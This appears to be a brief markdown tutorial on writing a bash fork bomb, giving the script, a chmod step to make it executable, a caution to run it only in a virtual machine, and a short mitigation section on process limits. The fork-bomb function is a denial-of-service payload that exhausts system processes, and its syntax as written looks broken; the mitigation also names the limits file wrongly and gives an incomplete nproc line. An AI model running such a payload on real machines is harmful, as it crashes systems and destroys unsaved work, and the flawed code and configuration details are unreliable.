# Creating a Forkbomb with Bash
>[!CAUTION]
> Do not use this script on your PC, it may damage your operating system. Use a virtual machine.
#
Create a script with <code>vi forkbomb.sh</code> and inside we will insert:
```
fork() {fork | fork &}; fork
echo "This is a forkbomb!"
```
To give it execution permissions without asking root for the password we will use <code>chmod +x forkbomb.sh</code>
#
## Mitigated a forkbomb
These types of attacks can be mitigated by going to <code>/etc/security/limit.conf</code> setting the maximum processes to 300/350.
For systems that use Linux starting from version 2.6 just add the line <code>hard nproc 300</code>.
